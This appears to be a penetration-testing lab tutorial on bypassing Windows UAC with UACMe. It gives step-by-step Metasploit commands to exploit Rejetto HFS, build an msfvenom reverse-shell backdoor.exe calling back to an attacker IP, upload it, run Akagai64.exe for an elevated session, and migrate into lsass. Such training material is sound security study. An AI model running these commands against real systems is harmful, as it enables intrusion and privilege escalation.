---
description: User account control
---

# 2 - Bypassing UAC with UACme

### **UAC (User Account Control)**

* User Account Control (UAC) is a Windows security feature introduced in Windows Vista that is used to prevent unauthorized changes from being made to the operating system.
* UAC is used to ensure that changes to the operating system require approval from the administrator or a user account that is part of the local administrator group.
* A non-privileged user attempting to execute a program with elevated privileges will be prompted with the UAC credential prompt, whereas a privileged user will be prompted with a consent prompt.
* Attacks can bypass UAC in order to execute malicious executables with elevated privileges.

### **Bypassing UAC**

* **In order to successfully bypass UAC, we will need to have access to a user account that is part of the local administrator group on the Windows target system.**
* UAC allows a program to be executed with administrative privileges, consequently prompting the user for confirmation.
* UAC has various integrity levels ranging from low to high, if the UAC protection level is set below high, Windows programs can be executed with elevated privileges without prompting the user for confirmation.
* There are multiple tools and techniques that can be used to bypass UAC, however, the tool and technique used will depend on the version of Windows running on the target system.

### **Bypassing UAC With UACMe**

* UACMe is an open source, robust privilege escalation tool developed by @hfiref0x. It can be used to bypass Windows UAC by leveraging various techniques.
  * GitHub: [https://github.com/hfiref0x/UACME](https://github.com/hfiref0x/UACME)
* The UACME GitHub repository contains a very well documented list of methods that can be used to bypass UAC on multiple versions of Windows ranging from Windows 7 to Windows 10.
* Allows attackers to execute malicious payloads on a Windows target with administrative/elevated privileges by abusing the inbuilt Windows AutoElevate tool.
* The UACMe GitHub repository has more than 60 exploits that can be used to bypass UAC depending on the version of Windows running on the target.

###

### **Practical Demonstration**

#### Gaining  a meterpreter session on the victim OS using Metasploit.

```bash
# we are leveraging the vuln from the victim web server running HFS http file server by rejetto, v2.3 .
# service postgresql start && msfconsole
setg RHOSTS $ip
search rejetto
use exploit/windows/http/rejetto_hfs_exec
# it sets the default 32bit payload, which is fine in this case.
options
set LHOST and LHOST  # everything is set by default in the lab.
# if the http file server was running on a subdirectory on the webserver we can specify it in the "set TARGETURL", but in this case it runs in the root directory.
exploit
# we get a meterpreter session.
```

#### Step 1

Perform basic enumeration and make sure that the user you're currently logged with is part of the administrator local group.

In our meterpreter session

```bash
sysinfo  # returns system information.
# we can see we have a 32bit "x86/window" meterpreter session.
# we can migrate to a 64bit process, lets use the explorer process.
pgrep explorer # searches for the process id for the explorer process.
migrate 2448
# our session is now a 64bit session.
getuid  # Return username currently logged.
getprivs # Returns privileges of the current user.
# lets open a shell session to verify the user is part of the local administrator group.
shell  #Open a shell on the target system.
net user  # Returns the list of users on the system.
net localgroup administrators #Returns the list of users part of the administrator local group.

```

#### Step 2

[https://github.com/hfiref0x/UACME](https://github.com/hfiref0x/UACME)

Generate a payload with msfvenom.

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=$kali_ip LPORT=1234 -f exe > backdoor.exe`&#x20;

#### Step 3

Configure listener for the payload previously generated.

```bash
# we use the metasploit multi/hanadler module.
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST $kali_ip
set LPORT 1234
run
```

#### Step 4

Transfer the payload and Akagai.exe to a Temp directory.

`upload backdoor.exe` - upload the payload to the target.

`upload /Akagai64.exe` - upload the Akagai binary.

We are going to be using the "Akagai" binary file to run our backdoor.exe payload in order to bypass UAC.

> .\Akagai64.exe \<keyNumber> \<pathToPayload>

We go back o the cmd prompt shell session `shell` .

`.\Akagai64.exe 23 C:\Temp\backdoor.exe` - Bypass UAC with Akagai.exe and get elevated privileges with same user.

We receive an elevated Meterpreter session on our multi/handler listener.

```bash
# in the elevated meterpreter session, we can verify our priv now.
sysinfo
getuid
getprivs  # we have more privileges now.
# but our session is 32bit (x86/window), we can migrate to a 64bit process or NT AUTHORITY process..
# lets migrate to the "lsas" process, you can select any one.
migrate 688  # we get a 64bit meterpreter session.
sysinfo
getuid # to verify.
```

